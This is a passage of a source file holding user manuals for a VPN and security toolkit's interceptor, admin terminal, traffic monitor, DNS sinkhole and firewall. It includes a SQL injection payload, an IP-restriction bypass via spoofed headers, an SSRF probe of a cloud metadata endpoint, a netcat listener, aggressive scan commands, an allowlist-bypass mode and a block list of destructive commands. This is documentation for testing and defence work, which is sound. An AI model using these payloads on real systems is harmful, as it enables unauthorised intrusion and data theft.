    Match: X-Frame-Options: .*\r\n
    Replace: (empty)

  Add X-Forwarded-For to every request:
    Scope: Request Headers
    Match: ^Host: (.*)
    Replace: Host: $1\r\nX-Forwarded-For: 127.0.0.1

9. REQUEST HISTORY & REPLAY

  All traffic that passes through the proxy (intercepted or
  pass-through) is logged in the History tab.

  History columns:
  #     Sequential request number
  Method  GET POST PUT DELETE etc.
  Host    Target hostname
  Path    Request path
  Status  HTTP response status code
  Length  Response body size in bytes
  Time    Response time in milliseconds
  MIME    Response Content-Type

  Filtering history:
  • Search box: filter by host, path, or response content
  • Status filter: show only 2xx / 3xx / 4xx / 5xx
  • Method filter: show only POST requests (for mutation testing)

  Replay:
  1. Click any history entry → full request shown in edit panel.
  2. Modify any part of the request.
  3. Click "Send" → response displayed.
  4. Click "Diff" → compare this response to the original.

  Send to other tools:
  • "Send to Intruder" → use this request as Intruder base
  • "Send to Repeater" → clone to standalone replay panel

10. INTEGRATION WITH OTHER TOOLS

  HTTP Interceptor works as the request capture layer for:

  Intruder:
    Capture a request → "Send to Intruder" → Intruder fuzzes
    the marked parameter with a payload list automatically.

  JWT Analyzer:
    When a request contains an Authorization: Bearer header,
    the Interceptor shows "Analyze JWT" → one click opens the
    JWT Analyzer with the token pre-loaded.

  Ghost Chain:
    From any intercepted request, "Send to Ghost Chain" pre-fills
    the HTTP Probe field with this request for PoC code generation.

11. TIPS & COMMON WORKFLOWS

  WORKFLOW: Test for SQL Injection
  1. Browse to target's search page / login form.
  2. Submit a form with Intercept ON.
  3. In the caught request, change the field value to ' or '1'='1
  4. Forward → observe response for DB error or different result.
  5. If confirmed: Send to SQLMap for automated exploitation.

  WORKFLOW: Test for IDOR
  1. Log in as User A, capture a request for /api/account/123.
  2. Log in as User B in a different browser (or incognito).
  3. In Interceptor (still showing User A's session), change
     Cookie to User B's session and /account/123 to /account/456.
  4. Forward → if you get User A's data with User B's ID = IDOR.

  WORKFLOW: Bypass IP Restriction
  1. Get a 403 when accessing /admin.
  2. Intercept the request, add: X-Forwarded-For: 127.0.0.1
  3. Also try: X-Real-IP: 127.0.0.1  X-Client-IP: 127.0.0.1
  4. Forward → if 200, the server trusts the header without validation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "terminal-manual",
    title: "Remote Terminal — 4-Tab Shell",
    subtitle: "Shell execution, HTTP client, TCP port scanner, and audit log with ProxhqVPN Mode",
    version: "2.2",
    pages: 16,
    icon: Terminal,
    iconColor: "text-green-400",
    tier: "pro",
    content: `Remote Terminal — 4-Tab Shell — User Manual
Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Admin Feature (Command Center Pro)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Security Model
2. Tab 1 — Shell (Command Execution)
3. ProxhqVPN Mode (Shell Bypass)
4. Allowed Command Reference
5. Tab 2 — HTTP Client
6. Tab 3 — Port Scanner
7. Tab 4 — Audit Log
8. Security Constraints & Rate Limits

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & SECURITY MODEL

  The Terminal (/terminal) provides a web-based shell for executing
  commands on your ProxhqVPN server infrastructure. It is an admin
  tool — Clerk auth + admin role required to access.

  Security model:
  • Commands run as the ProxhqVPN service user (limited privileges)
  • Shell commands are validated against an allowlist by default
  • ProxhqVPN Mode bypasses the allowlist (full outbound access)
  • HARD_BLOCKED destructive patterns are always enforced regardless
    of mode: rm -rf /, mkfs, dd if=/dev/zero, format, shutdown, halt
  • All commands logged to the audit trail (Tab 4) with timestamp,
    output, and ProxhqVPN Mode status
  • Rate limit: 20 commands per minute

  Backend: Express API at /api/terminal
  Frontend: /terminal (admin role required)

2. TAB 1 — SHELL (COMMAND EXECUTION)

  The Shell tab lets you execute Linux commands on your ProxhqVPN
  server directly from the browser.

  Interface:
  • Command input field: type any command and press Enter or click Run
  • Output panel: shows stdout + stderr in real-time
  • Session: commands share the same working directory within a
    browser session (cd commands persist between commands)

  Useful diagnostic commands (all in allowlist):

  WIREGUARD STATUS:
    wg show                           # All WG interfaces + peers
    wg show wg0 latest-handshakes     # When each peer last connected
    wg show wg0 transfer              # Bytes in/out per peer
    ip route show table main          # Full routing table
    ip route show table all | grep wg # WireGuard-specific routes

  NETWORK DIAGNOSTICS:
    ss -tupn                          # All open sockets + processes
    ss -tnp | grep ESTABLISHED        # Active established connections
    netstat -an | grep LISTEN         # Listening services
    ip addr show                      # All network interfaces + IPs
    ip link show                      # Interface status (up/down)
    ping -c 4 8.8.8.8                 # Basic connectivity check
    traceroute 8.8.8.8                # Route tracing
    curl -s https://api64.ipify.org   # Verify current exit IP

  SYSTEM DIAGNOSTICS:
    df -h                             # Disk usage
    free -m                           # RAM usage in MB
    top -bn1 | head -20               # CPU and process snapshot
    uptime                            # System uptime + load average
    ps aux | grep wg                  # WireGuard process status
    journalctl -u wg-quick@wg0 -n 50  # WireGuard service logs
    systemctl status wg-quick@wg0     # WireGuard service status

  SECURITY DIAGNOSTICS:
    last -20                          # Recent login history
    faillog -a                        # Failed login attempts
    iptables -L -n --line-numbers     # Current firewall rules
    iptables -L INPUT -n              # Input chain rules only
    cat /var/log/auth.log | tail -50  # Auth log (recent)
    ss -lntp                          # Listening TCP services

  CERTIFICATE CHECKS:
    openssl s_client -connect host:443 </dev/null 2>&1 | grep "subject\|expire"
    certbot certificates              # Let's Encrypt cert status
    openssl x509 -in /path/cert.pem -noout -dates  # Cert expiry

3. PROXHQVPN MODE (SHELL BYPASS)

  ProxhqVPN Mode unlocks full outbound network access from the
  terminal — including commands not in the standard allowlist.

  Enable: Shell tab → toggle "ProxhqVPN Mode" → Confirm

  When ProxhqVPN Mode is ON:
  • A red "PROXHQVPN MODE ACTIVE" banner appears in the Shell
  • The command allowlist is bypassed
  • Full network access: nmap, curl, wget, nc, socat, ssh, etc.
  • Every command is logged with "mode: proxhqvpn" in audit log
  • HARD_BLOCKED patterns still enforced (rm -rf /, mkfs, etc.)

  Enabled commands in ProxhqVPN Mode:

  RECONNAISSANCE:
    nmap -sV -p 1-65535 target.com    # Full TCP version scan
    nmap -sU --top-ports 100 target   # UDP port scan
    nmap -sC -sV -O target.com        # Script + OS detection
    nmap --script vuln target.com     # Vulnerability scripts
    masscan -p 1-65535 target.com --rate 10000  # Fast port scan

  NETWORK TOOLS:
    nc -zv target.com 443             # TCP connectivity check
    nc -l -p 4444                     # Listen on port (netcat)
    socat TCP:target.com:443 -        # Advanced socket relay
    curl -v https://target.com        # Verbose HTTP request
    wget -O- https://target.com       # HTTP download
    whois target.com                  # WHOIS lookup
    dig +short target.com ANY         # DNS all records

  CRYPTOGRAPHY:
    openssl genrsa -out key.pem 4096  # Generate RSA key
    openssl req -new -x509 -key key.pem -out cert.pem  # Self-signed cert
    openssl dgst -sha256 file.txt     # File hash

  SHELL UTILITIES:
    awk, sed, grep, find, sort, uniq, cut, tr, head, tail, jq
    python3 -c "..."                  # Inline Python execution
    bash -c "..."                     # Inline bash script

  NOTE: ProxhqVPN Mode commands are fully logged and visible to
  all admins in the Audit Log tab. This is by design — all
  command execution on infrastructure must be auditable.

4. ALLOWED COMMAND REFERENCE (STANDARD MODE)

  The following commands are allowed without ProxhqVPN Mode:
  (Partial list — run 'help' in the terminal for full list)

  System: ps, top, df, free, uptime, uname, hostname, whoami,
          id, date, env, printenv, locale, lscpu, lsmem, lsblk,
          lsusb, lspci

  Files: ls, cat, head, tail, less, more, file, stat, md5sum,
         sha256sum, find, locate, which, whereis, readlink

  Network: ping, traceroute, tracepath, mtr, host, dig, nslookup,
           curl (GET only), wget (download only), ss, netstat,
           ip, ifconfig, arp, route

  WireGuard: wg, wg-quick (status only, no bring-up/down)

  Logs: journalctl, tail (log files), grep (log files), zcat

  Firewall: iptables -L (list only — no modification)

5. TAB 2 — HTTP CLIENT

  The HTTP Client tab is a command-line-style HTTP request tool
  for making arbitrary HTTP/HTTPS requests from the server.

  Unlike your browser's requests (which come from your IP),
  HTTP Client requests come from the ProxhqVPN server IP.
  Use this to:
  • Test server-side behavior from a different source IP
  • Test APIs without browser CORS restrictions
  • Verify that your VPN server can reach a target endpoint
  • Make requests through the VPN tunnel with the server's IP

  Interface:
  Method:  GET / POST / PUT / DELETE / PATCH / HEAD / OPTIONS
  URL:     Full URL including protocol (https://target.com/api)
  Headers: Key: Value pairs, one per line
  Body:    Request body (for POST/PUT/PATCH)

  Examples:

  Test REST API endpoint:
    Method: GET
    URL: https://api.target.com/v1/users
    Headers:
      Authorization: Bearer eyJhbGci...
      Accept: application/json

  Submit login form:
    Method: POST
    URL: https://target.com/auth/login
    Headers:
      Content-Type: application/json
    Body:
      {"username": "admin", "password": "test"}

  Custom SSRF probe:
    Method: GET
    URL: http://169.254.169.254/latest/meta-data/iam/
    (Tests if target server is on AWS — use from inside the VPN
     to simulate an SSRF-style request from the server side)

  The response panel shows:
  • Status code and status text
  • Response headers (full list)
  • Response body (JSON formatted if Content-Type is application/json)
  • Response time in milliseconds
  • Response size in bytes

6. TAB 3 — PORT SCANNER

  The Port Scanner tab is a TCP port scanner that runs from the
  ProxhqVPN server (not from your browser).

  Since scans come from the server IP (not your IP), they are
  useful for:
  • Testing what ports are accessible from the internet to the server
  • Validating your firewall rules are blocking the right ports
  • Checking if a target accepts connections from the VPN server

  Interface:
  Target:       IP address or hostname
  Port Range:   e.g. 1-1024, or comma-separated: 22,80,443,8080
  Timeout:      Per-port timeout in ms (default 2500ms)
  Concurrency:  Parallel connection attempts (default 20, max 100)

  Results table:
  Port   State    Service Name   Banner (if available)
  22     OPEN     SSH            SSH-2.0-OpenSSH_8.9p1
  80     OPEN     HTTP           HTTP/1.1 200 OK...
  443    OPEN     HTTPS          (TLS — no banner)
  3306   CLOSED   MySQL          (no response)
  5432   FILTERED PostgreSQL     (timeout)

  State meanings:
  OPEN:     TCP SYN-ACK received — port is listening
  CLOSED:   TCP RST received — port reachable but nothing listening
  FILTERED: Timeout — firewall dropping packets silently

  Common port ranges to scan:
  Standard services:  1-1024
  Extended services:  1-10000
  Database ports:     3306,5432,27017,6379,9200
  Admin panels:       8080,8443,8888,9090,9200,10000
  VPN/proxy ports:    1194,1723,4500,51820,1080,3128

7. TAB 4 — AUDIT LOG

  The Audit Log is an immutable timestamped record of every command
  executed through the Terminal, including who executed it and whether
  ProxhqVPN Mode was active.

  Columns:
  Timestamp    ISO 8601 timestamp (UTC)
  User         Clerk user ID of the executing user
  Mode         standard / proxhqvpn
  Command      Full command string
  Exit Code    0 = success, non-zero = error
  Duration     Command execution time in milliseconds

  Filtering:
  • Search by command text
  • Filter by mode (standard / proxhqvpn)
  • Filter by date range
  • Filter by user (multi-admin environments)

  Export: Download as CSV or JSON for compliance records.

  Retention: Audit logs are stored in PostgreSQL indefinitely.
  They cannot be deleted from the UI — contact support for GDPR
  deletion requests.

8. SECURITY CONSTRAINTS & RATE LIMITS

  Always enforced (cannot be bypassed):
  • rm -rf / or any path-traversal deletion
  • mkfs (filesystem format)
  • dd if=/dev/zero (device write)
  • chmod -R 777 / (world-writeable root)
  • >/dev/sda (direct device write)
  • shutdown, reboot, halt, poweroff
  • systemctl stop (service name = anything critical)

  Rate limits:
  • Standard mode: 20 commands per minute per session
  • ProxhqVPN mode: 20 commands per minute per session
  • HTTP Client: 60 requests per minute
  • Port Scanner: 5 scans per minute (server-side limit)

  Session isolation:
  Each browser session gets an isolated working directory.
  Two admins working simultaneously cannot see each other's
  shell session state, but both are visible in the Audit Log.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "network-monitor-manual",
    title: "Network Traffic Monitor",
    subtitle: "Real-time flow table, protocol breakdown, PCAP capture, and threat flagging",
    version: "1.2",
    pages: 12,
    icon: Network,
    iconColor: "text-blue-400",
    tier: "basic",
    content: `Network Traffic Monitor — User Manual
Version 1.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
VPN Basic Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Live Flow Table
3. Bandwidth Timeline
4. Protocol Breakdown
5. Geographic Routing
6. Threat Flag System
7. Packet Capture (PCAP)
8. Filtering & Search
9. Integration with Other Tools

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The Network Monitor (/network-monitor) provides real-time
  visibility into every network flow passing through your VPN
  tunnel — source/destination IPs, ports, protocols, bytes
  transferred, geographic origin, and active threat flags.

  Backend: Express API at /api/network-monitor
  Frontend: /network-monitor (VPN Basic)
  Refresh rate: 5 seconds (auto)
  Data source: real beacon alerts, blocked IPs, WireGuard peers,
               firewall status from PostgreSQL

2. LIVE FLOW TABLE

  The main flow table shows all active and recent connections.
  Auto-refreshes every 5 seconds.

  Columns:
  Source IP     → your device or peer IP inside the VPN tunnel
  Destination   → external IP address the traffic is going to
  Port          → destination port number
  Protocol      → TCP / UDP / ICMP
  Bytes In      → bytes received from destination
  Bytes Out     → bytes sent to destination
  Duration      → how long this connection has been open
  Country       → GeoIP lookup flag for destination IP
  Threat        → red triangle if destination is on a threat feed

  Sorting: click any column header to sort ascending/descending.

  Long-lived connections to unknown IPs (Duration > 30 min with
  no User activity expected) should be investigated in Ghost Trace
  or via Ghost Trap Manual IP Investigator.

3. BANDWIDTH TIMELINE

  The Timeline tab shows a 24-hour bandwidth chart:
  • X-axis: time (rolling 24h window, updated every 5 min)
  • Y-axis: bytes in/out (auto-scaled: KB, MB, GB)
  • Two lines: inbound (blue) and outbound (green)

  What to look for:
  • Sustained high outbound at unusual hours → potential exfil
  • Periodic spikes at regular intervals → scheduled transfer/sync
  • Near-zero inbound + high outbound → one-way data push
  • Traffic spike after device goes idle → background process

4. PROTOCOL BREAKDOWN

  The Protocols tab shows traffic composition by protocol:
  Bar chart: each protocol as a bar, length = bytes transferred.
  Table: Protocol, Bytes, % of total, Connection count.

  Common protocols you should see:
    HTTPS (443)   → normal web / app traffic
    DNS (53)      → domain lookups (monitor for DNS tunneling)
    NTP (123)     → time sync (small, regular)
    QUIC (443 UDP) → Chrome/YouTube traffic
    WireGuard     → VPN tunnel overhead

  Unusual protocols to investigate:
    IRC (6667)    → old botnet C2 protocol
    SMTP (25)     → your device sending email directly (spam?)
    Telnet (23)   → unencrypted remote access
    Port 4444     → Metasploit default listener
    DNS-heavy     → DNS tunneling (data exfil over DNS)

5. GEOGRAPHIC ROUTING

  The Countries tab shows destination traffic by country:
  World map heat map + table of countries sorted by bytes.

  Expected countries for your usage:
    US, EU countries → CDN, cloud services (normal)
    Unexpected: CN, RU, KP, IR → investigate immediately

  Note: CDN providers (Cloudflare, Akamai, Fastly) may show
  traffic going to many countries from servers that all serve
  the same content. Cross-reference with the destination IP
  in Threat Intel before acting on geolocation alone.

6. THREAT FLAG SYSTEM

  A red ⚠ triangle on any flow row means the destination IP
  matched at least one threat intelligence feed:
  • AbuseIPDB (confidence > 50)
  • Emerging Threats IP blocklist
  • Spamhaus DROP/EDROP
  • Known Tor exit nodes
  • Known botnet C2 infrastructure

  Hover the threat icon for the threat category and feed source.

  Click "Investigate" on any flagged IP:
  → Opens Ghost Trap Counter-Intel with the IP pre-loaded for
    full port scan + OSINT investigation.

  Click "Block" on any flagged IP:
  → Adds the IP to Firewall blocklist across all nodes immediately.

7. PACKET CAPTURE (PCAP)

  Network Monitor → Capture tab → "Start PCAP"

  Captures a 30-second packet capture on the WireGuard interface.
  The resulting .pcap file is downloadable immediately.

  Open in Wireshark for deep protocol analysis:
  • Protocol dissection (even encrypted TLS metadata)
  • Follow TCP stream
  • IO graph (bandwidth over time)
  • Expert info (retransmits, RSTs, errors)

  PCAP filter examples (enter in Wireshark filter bar):
    ip.addr == 185.220.101.47    # Filter to specific IP
    tcp.port == 4444             # Filter to specific port
    dns                          # Show all DNS queries
    http                         # Show HTTP traffic
    tls.handshake.type == 1      # TLS Client Hello only

  NOTE: PCAP captures all traffic on the WireGuard interface.
  This includes traffic from all connected peers if this is a
  server-mode node. Handle PCAP files securely — they contain
  raw network data.

8. FILTERING & SEARCH

  Search box: filter all tabs by IP address, hostname, or port.
  Example searches:
    185.220        → show flows to/from IPs starting with 185.220
    :443           → show all HTTPS flows
    CN             → show flows to China-geolocated IPs
    4444           → show flows on port 4444

  Column filters:
  • Country: dropdown filter to show only one country's traffic
  • Protocol: TCP / UDP / ICMP toggle buttons
  • Threat only: checkbox to show only threat-flagged flows

9. INTEGRATION WITH OTHER TOOLS

  From any flow entry:
  • "Investigate IP" → Ghost Trap Counter-Intel (port scan + OSINT)
  • "Block IP" → Firewall (immediate block across all nodes)
  • "Check Reputation" → Threat Intel (/threat-intel) IP lookup
  • "Trace Route" → Terminal tab (traceroute to destination IP)

  Ghost Trace integration:
  If a peer's traffic appears in Network Monitor with suspicious
  patterns, check Ghost Trace (/ghost-trace) → Peers tab for
  that device's anomaly score and baseline deviation details.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "dns-sinkhole-manual",
    title: "DNS Sinkhole",
    subtitle: "Pi-hole-style DNS blocking: categories, custom rules, query log, and statistics",
    version: "1.3",
    pages: 14,
    icon: Shield,
    iconColor: "text-green-400",
    tier: "basic",
    content: `DNS Sinkhole — User Manual
Version 1.3 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
VPN Basic Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. How DNS Sinkholing Works
2. Block List Categories
3. Enabling / Disabling Categories
4. Custom Block & Allow Rules
5. Domain Lookup Tool
6. Statistics Dashboard
7. Query Log
8. DNS-over-HTTPS (DoH) Configuration
9. Limitations & Edge Cases

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. HOW DNS SINKHOLING WORKS

  Every device on your VPN tunnel makes DNS queries to resolve
  domain names to IP addresses. Normally these go to your ISP's
  DNS or a public resolver like 8.8.8.8.

  DNS Sinkhole intercepts ALL DNS queries from VPN-connected
  devices and routes them through the ProxhqVPN DNS resolver.
  The resolver checks each queried domain against block lists.

  If the domain matches a block list:
  → The resolver returns 0.0.0.0 (null/invalid address)
  → The device gets no IP to connect to
  → The connection dies at the DNS layer — the ad/tracker/malware
    never loads, no data is sent, no connection is made.

  If the domain does NOT match any block list:
  → The query is forwarded to the upstream resolver (configurable:
    Cloudflare DoH, Quad9, Google, or custom)
  → The real IP is returned to the device

  DB tables: dns_sinkhole_config, dns_sinkhole_custom_rules
  Backend: /api/dns-sinkhole

2. BLOCK LIST CATEGORIES

  Ads & Trackers (default: ON)
    100,000+ domains: Google Ads, DoubleClick, Facebook Pixel,
    Amazon Ads, Unity Ads, AppLovin, MoPub, ironSource, and all
    major ad exchange networks. Covers web ads, in-app ads,
    smart TV ads. Blocks tracker beacons: Google Analytics,
    Mixpanel, Amplitude, Segment, HotJar, FullStory.

  Malware & Phishing (default: ON)
    Known malware distribution sites, phishing domains, drive-by
    download hosts. Updated from Malware Domain List, ESET,
    Abuse.ch URLhaus, PhishTank, and OpenPhish daily.
    Also blocks known ransomware C2 domains.

  Botnet C2 (default: ON)
    Command-and-control domains for known botnets:
    Mirai, Emotet, TrickBot, Qbot, Dridex, ZLoader, and 200+
    more. Prevents infected devices from receiving commands or
    exfiltrating data even if they are already infected.

  Cryptomining (default: ON)
    Browser-based cryptojacking domains (Coinhive-style and
    successors). Stops drive-by mining scripts from using your
    CPU. Also blocks known mining pool domains.

  Stalkerware & Spyware (default: ON)
    Mobile stalkerware control domains that silently upload
    location, contacts, messages, and photos. Important for
    shared family/business WiFi environments.

  Adult Content (default: OFF)
    Parental control block list. Over 1M adult content domains.
    Enable for family/school/workplace environments.

3. ENABLING / DISABLING CATEGORIES

  DNS Sinkhole → Categories tab → toggle each category ON/OFF.
  Changes take effect immediately — no restart required.
  Toggle state is stored in dns_sinkhole_config table in PostgreSQL.

  Per-device exceptions:
  If a specific device needs access to a blocked category
  (e.g. a work device needs an ad-heavy site), use a custom
  allow rule (Section 4) to whitelist that specific domain —
  rather than disabling the entire category for all devices.

4. CUSTOM BLOCK & ALLOW RULES

  DNS Sinkhole → Custom Rules tab

  Allow Rule (whitelist):
    Overrides any block list. Use to un-block specific domains
    that are incorrectly categorized.
    Format: one domain per line.
    Wildcard: *.example.com allows all subdomains of example.com
    Example: analytics.trusted-vendor.com

  Block Rule (custom blacklist):
    Blocks specific domains regardless of category settings.
    Use to block a specific domain not on any built-in list.
    Format: one domain per line. Wildcards supported.
    Example: competitor-site.com  *.ads.competitor.com

  Hit Counter:
    Each custom rule shows a hit count — how many times the rule
    has matched a DNS query. Rules with 0 hits after 7+ days can
    be safely removed.

  Import / Export:
    Bulk import: paste a newline-separated list of domains.
    Export: download current allow/block lists as .txt files.

5. DOMAIN LOOKUP TOOL

  DNS Sinkhole → Lookup tab

  Enter any domain name to check its block status instantly:
  • BLOCKED — which category list(s) match
  • ALLOWED — custom allow rule is active
  • CLEAN — not on any list, passes through to upstream resolver

  Also shows:
  • Resolved IP (if not blocked)
  • Last query timestamp (if this domain was queried recently)
  • Hit count (how many times devices have queried this domain)

  The lookup is a local check against the sinkhole database.
  It does NOT make any external DNS query — safe to use for
  investigating suspicious domains without alerting the domain.

6. STATISTICS DASHBOARD

  DNS Sinkhole → Stats tab (auto-refreshes every 30 seconds)

  Today's summary cards:
  • Total Queries — all DNS lookups across all VPN-connected devices
  • Blocked — count and % blocked today
  • Allowed — passed through to upstream
  • Unique Domains — distinct domains queried

  Top Blocked Domains chart:
  Bar chart of the 10 most-blocked domains today. Useful for:
  • Understanding which ad networks your devices use most
  • Identifying which device generates the most blocked queries
  • Spotting unusual blocked domains (unexpected C2 attempts)

  Block rate by category:
  Pie chart showing which categories are responsible for the most
  blocked queries. A very high Botnet C2 block rate on a specific
  device warrants investigation in Ghost Trace.

7. QUERY LOG

  DNS Sinkhole → Log tab (most recent 1000 queries)

  Columns:
  Timestamp  → query time (UTC, accurate to millisecond)
  Device     → peer IP or device name
  Domain     → the queried domain name
  Result     → ALLOWED / BLOCKED / SINKHOLED + category
  Upstream   → resolver used (if allowed through)
  Response   → returned IP (or 0.0.0.0 if blocked)

  Filtering:
  • Search by domain, device IP, or status
  • Filter: BLOCKED only — to review what's being intercepted
  • Filter: by device — to see one device's DNS activity
  • Date range filter

  Export: download log as CSV for compliance or analysis.

8. DNS-OVER-HTTPS (DoH) CONFIGURATION

  DNS Sinkhole → Settings → Upstream Resolver

  Choose where non-blocked DNS queries are forwarded:
  • Cloudflare (1.1.1.1) via DoH — default
  • Quad9 (9.9.9.9) via DoH — malware-filtering upstream
  • Google (8.8.8.8) via DoH
  • Custom DoH endpoint — enter any RFC 8484 compatible URL

  DNS-over-HTTPS encrypts all upstream DNS queries, preventing
  your ISP or network observers from seeing what domains your
  devices look up even for allowed queries.

  Test upstream connectivity:
  DNS Sinkhole → Settings → Test Resolver (runs a live DNS check)

9. LIMITATIONS & EDGE CASES

  What DNS Sinkhole CANNOT block:
  • Apps that hardcode IP addresses (bypass DNS entirely)
    → Use Firewall to block those IPs directly
  • DNS queries that bypass the VPN tunnel
    → Ensure kill switch is active and DNS leak test passes
  • HTTPS traffic to non-blocked domains
    → DNS Sinkhole only controls resolution, not encryption
  • Peer-to-peer / DHT traffic (BitTorrent doesn't use DNS)
  • Apps using DNS-over-HTTPS to their own resolvers
    → Block DoH provider IPs via Firewall if needed

  False positives (legitimate sites getting blocked):
  Common cause: CDNs serving ads and legitimate content from
  the same domain (e.g. some analytics subdomains).
  Fix: add the specific subdomain to the custom allow list.
  Do NOT disable the entire category — add a targeted exception.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "firewall-manual",
    title: "Firewall Manager",
    subtitle: "iptables/nftables rules, IP blocklist, GeoIP blocking, and iptables export",
    version: "1.5",
    pages: 14,
    icon: Shield,
    iconColor: "text-red-400",
    tier: "basic",
    content: `Firewall Manager — User Manual
Version 1.5 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
VPN Basic Feature (Admin)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Rule Types
3. Creating Rules
4. Block IP / CIDR
5. Allow Port
6. Rate Limiting
7. GeoIP Country Blocking
8. Auto-Block (from Ghost Trap / Ghost Trace)
9. Exporting iptables Rules
10. Rule Ordering & Priority

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The Firewall Manager (/firewall) manages iptables/nftables rules
  across all 60 ProxhqVPN nodes from a single interface. Rules
  created here are applied to every node simultaneously.

  Backend: Express API at /api/firewall
  Frontend: /firewall (admin role required)
  DB tables: firewall_rules, blocked_ips, firewall_status

  The Firewall has three tabs:
  • Rules — create and manage firewall rules
  • Blocked IPs — list of currently blocked IPs
  • Export — generate downloadable iptables scripts

2. RULE TYPES

  BLOCK IP / CIDR
    Drop all packets from a specific IP or IP range.
    Applied to all 60 nodes simultaneously.
    Supports CIDR notation: 185.220.101.0/24

  ALLOW PORT
    Allow inbound traffic on a specific port/protocol.
    Used to whitelist services: WireGuard (51820/UDP),
    SSH (22/TCP), HTTPS (443/TCP).

  RATE LIMIT
    Limit connection rate per source IP.
    Protects against DDoS, brute force, and port scanners.
    Example: max 5 new SSH connections per minute per IP.

  GEO BLOCK
    Block all traffic from specific countries by ASN/CIDR.
    Uses MaxMind GeoIP database (updated weekly).
    Apply per-country or per-region (EU, APAC, etc.)

  PORT KNOCK SEQUENCE
    Hidden port sequence required before a port is opened.
    See Proxy & Tor (/proxy) for full port knocking setup.

3. CREATING RULES

  Firewall → Rules → + Add Rule

  Required fields:
  • Rule Type: Block IP / Allow Port / Rate Limit / GeoIP Block
  • Direction: Inbound / Outbound / Both
  • Priority: 1–100 (lower = evaluated first)
  • Description: human-readable label for the rule
  • Active: YES / NO (inactive rules are stored but not applied)

  For Block IP rules:
  • IP/CIDR: e.g. 185.220.101.47 or 185.220.101.0/24
  • Protocol: TCP / UDP / ICMP / ALL
  • Expiry: permanent / 24h / 7 days / 30 days / custom

  For Allow Port rules:
  • Port: 1-65535 (or range: 8000-8999)
  • Protocol: TCP / UDP
  • Source IP restriction: optional CIDR to limit who can access

  For Rate Limit rules:
  • Port: the port to rate-limit
  • Rate: e.g. 10/min (10 connections per minute)
  • Burst: burst allowance (connections above rate before limit)
  • Action: DROP (silent) / REJECT (sends reset to attacker)

4. BLOCK IP / CIDR — DETAILED

  Blocking a single IP:
  → Blocks all traffic from that IP across all ports.
  → Applied to both the VPN tunnel interface and the server's
    public-facing interface.

  Blocking a CIDR range:
  → Use when an attacker is rotating IPs within a range.
  → Common ranges to block: /24 (256 IPs), /16 (65536 IPs)
  → Verify the range with a WHOIS lookup to avoid over-blocking
    (some ranges contain many legitimate users/CDNs).

  Temporary blocks:
  → Set an expiry (24h, 7 days, etc.) for automated scanner IPs.
  → Permanent blocks should be reserved for confirmed malicious
    actors or known botnet infrastructure.

  Auto-populated blocks:
  → Ghost Trap auto-blocks IPs with 3+ trap hits in 60 minutes.
  → Ghost Trace auto-suggests blocks for IPs scoring > 90.
  → These appear in the Blocked IPs tab with source label
    "Ghost Trap" or "Ghost Trace".

5. ALLOW PORT — COMMON CONFIGURATIONS

  Required ports (do not block):
    51820/UDP    WireGuard VPN tunnel — must be open
    443/TCP      HTTPS for admin dashboard access
    80/TCP       HTTP (if Let's Encrypt cert renewal active)

  Optional service ports:
    22/TCP       SSH — restrict to admin IP CIDR only
    25/TCP       SMTP — only if running mail server
    53/UDP       DNS — only if running recursive resolver

  ProxhqVPN-specific ports:
    51820/UDP    WireGuard primary
    51821-51870/UDP  WireGuard additional nodes (if multi-port)

  SSH lockdown example (restrict SSH to your IP only):
  1. Create Allow Port rule: 22/TCP, Source: YOUR_IP/32
  2. Create Block IP rule: 0.0.0.0/0, Port: 22/TCP, after above
  3. Verify with: ss -lntp | grep :22

6. RATE LIMITING

  Rate limiting protects against:
  • SSH brute force (limit: 5 connections per minute per IP)
  • Port scanning (limit new connections to any port)
  • API abuse (limit requests per minute on port 443)
  • DDoS (limit connection rate from any single source)

  SSH brute force protection (recommended for all deployments):
  Rule: Rate Limit, Port 22/TCP, 5/min, Burst 10, DROP

  This blocks IPs that attempt more than 5 SSH connections per
  minute — enough for a legitimate user to reconnect after a
  dropped session, but stops automated brute forcers.

  Verify rate limit is active:
  Terminal → iptables -L INPUT -n | grep limit

7. GEOIP COUNTRY BLOCKING

  Firewall → Rules → Add Rule → GeoIP Block

  Select countries from the dropdown. Multiple countries can be
  selected for a single rule.

  GeoIP blocking is approximate — accuracy is ~99% for country-
  level blocking, but sophisticated attackers use VPNs or
  Tor exit nodes in unblocked countries to evade GeoIP rules.

  GeoIP block use cases:
  • Block Russia, China, North Korea (common attack sources)
  • Block all countries except yours (maximum restriction)
  • Block by region: block all APAC if you only serve EU users

  Verify GeoIP is working:
  Use a VPN node in the blocked country → try to access your
  server → should receive a DROP (no response / timeout).

8. AUTO-BLOCK (FROM OTHER TOOLS)

  The Firewall receives automatic block suggestions from:

  Ghost Trap:
